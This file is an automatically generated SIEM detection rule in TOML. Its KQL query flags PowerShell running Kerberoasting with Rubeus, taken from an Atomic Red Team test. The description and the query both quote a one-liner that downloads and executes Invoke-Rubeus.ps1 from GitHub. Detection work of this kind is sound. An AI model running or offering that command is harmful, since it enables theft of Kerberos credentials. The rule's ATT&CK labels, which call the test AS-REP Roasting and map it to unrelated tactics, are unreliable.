[rule]
author = [ "AtomicRedTeam-Automation",]
description = "Detection for specific test 'WinPwn - PowerSharpPack - Kerberoasting Using Rubeus' (GUID: 8c385f88-4d47-4c9a-814d-93d9deec8c71) of technique T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting). Test Description: PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus...."
from = "now-9m"
rule_id = "9973a38e-2835-44f9-b023-605444f4e6e8"
language = "kql"
name = "Atomic Test: T1558.004 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
output_index = ".siem-signals-default"
references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1558.004/T1558.004.yaml",]
risk_score = 50
severity = "medium"
tags = [ "AtomicRedTeam", "T1558.004", "8c385f88-4d47-4c9a-814d-93d9deec8c71", "windows",]
type = "query"
query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')*\\\" AND powershell.script_block_text : \\\"*Invoke-Rubeus*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')*\\\" AND process.command_line : \\\"*Invoke-Rubeus*\\\"))"
version = 1
index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1558.004"
name = "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
reference = "https://attack.mitre.org/techniques/T1558/004"

[[rule.threat.tactic]]
id = "TA0003"
name = "Persistence"
reference = "https://attack.mitre.org/techniques/T1558/004"

[[rule.threat.tactic]]
id = "TA0004"
name = "Privilege Escalation"
reference = "https://attack.mitre.org/techniques/T1558/004"

[[rule.threat.tactic]]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/techniques/T1558/004"


